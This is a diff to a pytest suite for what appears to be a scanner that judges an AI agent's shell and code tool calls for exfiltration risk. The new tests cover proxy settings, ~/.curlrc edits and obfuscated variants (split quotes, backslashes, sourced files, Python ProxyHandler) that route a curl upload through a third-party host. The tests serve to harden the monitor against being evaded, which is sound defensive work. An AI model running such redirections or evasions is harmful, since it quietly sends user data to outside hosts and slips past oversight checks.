@@ -18,7 +18,7 @@ import json
 import pytest
 from test_channel_bindings import cron_send
 from test_converge_scan import BENIGN_ANSWERS, CLOCK, KEY
-from test_credential_home import ENV, HOME_HOST, READ_KEY, case, code
+from test_credential_home import ENV, HOME_HOST, ORACLE, READ_KEY, case, code
 from test_jev_probes import FakeDecider
 from test_session_sets import seed
 
@@ -32,6 +32,7 @@ from sentrook.serve.config import ServeConfig
 V10, V11 = load_params("conv-v10"), load_params("conv-v11")
 NAME = "EXAMPLE_API_KEY"
 EMPTY = {"entities": []}  # the owner's own service: nothing in the library
+LIBRARY = ORACLE  # the library lists the key's home host
 LOOKALIKE = "api.example-invalid.net"
 OTHER = "paste.othersite.invalid"
 #: The session read the key's env file earlier and judged it sensitive.
@@ -505,3 +506,128 @@ def test_a_sibling_that_sends_by_another_route_is_not_relieved(sibling):
 )
 def test_code_that_also_reaches_an_unwritten_target_is_not_relieved(extra):
     assert_unchanged(owner_send(code(extra=extra)))
+
+
+# --------------------------------------------------------------------------- proxies and curl's config file
+
+
+def _step(n: int, cmd: str, decision: str = "approved_by_user") -> dict:
+    return {
+        "step": n,
+        "turn": 1,
+        "call_id": f"c{n}",
+        "tool": "terminal",
+        "tool_kind": "exec",
+        "provider": {"kind": "host"},
+        "arguments": {"command": cmd},
+        "decision": decision,
+    }
+
+
+CURL = f"curl -d @notes.md https://{HOME_HOST}/v1/pages"
+
+
+@pytest.mark.parametrize(
+    "earlier",
+    [
+        "export https_proxy=http://p.othersite.invalid:3128",
+        "export HTTPS_PROXY=http://p.othersite.invalid:3128",
+        "echo 'proxy = p.othersite.invalid:3128' >> ~/.curlrc",
+        "export CURL_HOME=/tmp/c",
+        "export 'https_pro''xy=http://p.othersite.invalid:3128'",
+        "export https_pro\\xy=http://p.othersite.invalid:3128",
+        "read https_proxy <<< http://p.othersite.invalid:3128; export https_proxy",
+        "cp cfg ~/.cur''lrc",
+        "source ./vars",
+        ". ./vars",
+    ],
+    ids=[
+        "https_proxy",
+        "HTTPS_PROXY",
+        "curlrc",
+        "CURL_HOME",
+        "quoted",
+        "backslash",
+        "read",
+        "quoted-curlrc",
+        "source",
+        "dot",
+    ],
+)
+def test_a_proxy_or_curl_config_set_earlier_in_the_session_closes_coverage(earlier):
+    raw = _shell(CURL)
+    raw["history"] = [_step(1, earlier)]
+    raw["session"]["step"] = 2
+    raw["pending_call"]["call_id"] = "call_2"
+    assert_unchanged(raw, state=CLEAN)
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        f"HTTPS_PROXY=http://p.othersite.invalid:3128 {CURL}",
+        f"all_proxy=socks5://p.othersite.invalid {CURL}",
+    ],
+    ids=["https", "all"],
+)
+def test_a_proxy_set_on_the_call_itself_closes_coverage(cmd):
+    assert_unchanged(_shell(cmd), state=CLEAN)
+
+
+@pytest.mark.parametrize(
+    "extra",
+    [
+        "urllib.request.install_opener(urllib.request.build_opener(urllib.request.ProxyHandler({'https': 'p.othersite.invalid:3128'})))\n",
+        "os.environ['https_proxy'] = 'http://p.othersite.invalid:3128'\n",
+    ],
+    ids=["ProxyHandler", "environ"],
+)
+def test_a_proxy_set_in_code_closes_coverage(extra):
+    src = code().replace("r=urllib.request.Request", extra + "r=urllib.request.Request", 1)
+    assert_unchanged(owner_send(src))
+
+
+def test_a_session_with_no_proxy_keeps_coverage():
+    raw = _shell(CURL)
+    raw["history"] = [_step(1, "ls ~/notes")]
+    raw["session"]["step"] = 2
+    raw["pending_call"]["call_id"] = "call_2"
+    assert granted_send_reasons(scan(raw, state=CLEAN))
+
+
+# --------------------------------------------------------------------------- grant hints see the relief
+
+
+def _hints(res) -> list[tuple[str, str]]:
+    return [(h.kind, h.pattern) for h in res.response.grant_hints]
+
+
+def test_the_destination_hint_is_offered_when_the_granted_send_relief_would_clear_the_send():
+    """The library knows the key's home, so the host already lost its distrust and origin: the hint re-score used to
+    find nothing left for a destination grant to do."""
+    raw = owner_send(grants=[])
+    before, res = (
+        scan(raw, V10, oracle=LIBRARY, state=CLEAN),
+        scan(raw, oracle=LIBRARY, state=CLEAN),
+    )
+    assert decide(res.response) == "review"
+    assert ("destination", HOME_HOST) not in _hints(before)
+    assert ("destination", HOME_HOST) in _hints(res)
+    hint = next(h for h in res.response.grant_hints if h.pattern == HOME_HOST)
+    assert hint.risk < 45
+    after = scan(owner_send(grants=[grant(HOME_HOST)]), oracle=LIBRARY, state=CLEAN)
+    assert after.response.risk == pytest.approx(hint.risk, abs=0.5)
+
+
+def test_no_destination_hint_for_a_send_the_judge_reads_as_off_request():
+    raw = owner_send(grants=[])
+    assert ("destination", HOME_HOST) not in _hints(
+        scan(raw, oracle=LIBRARY, state=CLEAN, a=answers(0.4))
+    )
+
+
+def test_no_destination_hint_for_a_send_beside_an_unwritten_route():
+    raw = owner_send(
+        code(extra="import subprocess\nsubprocess.run(['git','push','origin','main'])\n"), grants=[]
+    )
+    assert ("destination", HOME_HOST) not in _hints(scan(raw, oracle=LIBRARY, state=CLEAN))
